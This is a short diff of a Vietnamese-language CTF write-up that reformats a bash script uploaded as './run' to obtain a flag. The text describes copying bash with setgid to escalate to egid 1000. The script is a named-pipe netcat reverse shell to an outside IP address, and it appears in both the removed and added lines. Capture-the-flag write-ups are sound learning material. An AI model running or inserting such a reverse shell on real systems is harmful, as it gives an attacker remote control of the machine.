@@ -48,10 +48,11 @@
 - ![image](https://user-images.githubusercontent.com/82523299/188442375-9e476321-b864-4427-b75e-6f93707a0fd3.png)
 - File này sẽ copy bash vào thư mục data và thiết lập setgid và thực thi shell với egid=1000 
 - Sau đó up script dưới dạng file ./run để nhận flag là xong
-```#!/usr/bin/bash
+`
+"#!/usr/bin/bash
 rm /tmp/f
 mkfifo /tmp/f
-cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f```
+cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f" `
 
 `
 $cat ../../flag2
